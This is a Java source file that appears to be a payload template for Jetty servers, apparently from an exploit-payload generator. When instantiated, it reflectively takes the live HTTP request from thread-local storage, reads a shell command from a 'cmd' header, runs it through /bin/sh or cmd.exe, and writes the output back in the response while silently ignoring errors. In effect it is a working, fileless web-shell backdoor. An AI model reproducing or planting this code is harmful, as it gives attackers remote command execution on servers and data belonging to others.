package jeg.core.template.jetty;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.util.Scanner;

public class JettyCmdExecTpl {
    private String getReqHeaderName() {
        return "cmd";
    }


    public JettyCmdExecTpl(){
        run();
    }


    private void run(){
        try {
            Thread thread = Thread.currentThread();
            Field field = Class.forName("java.lang.Thread").getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object threadLocals = field.get(thread);
            Class<?> threadLocalMap = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field tableField = threadLocalMap.getDeclaredField("table");
            tableField.setAccessible(true);
            Object table = tableField.get(threadLocals);

            Class<?> entry = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field valueField = entry.getDeclaredField("value");
            valueField.setAccessible(true);
            Object httpConnection = null;

            Object obj;
            for (int i = 0; i < Array.getLength(table); ++i) {
                obj = Array.get(table, i);
                if (obj != null) {
                    httpConnection = valueField.get(obj);
                    if (httpConnection != null && httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                        break;
                    }
                }
            }

            Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
            Object response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
            Object request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
            String cmd = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{getReqHeaderName()});
            if(cmd != null){
                PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                writer.write(exec(cmd));
                writer.flush();
                writer.close();
            }

        }catch (Exception ignored){
        }
    }

    private String exec(String cmd){
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        }catch (Exception e){
            return e.getMessage();
        }
    }
}
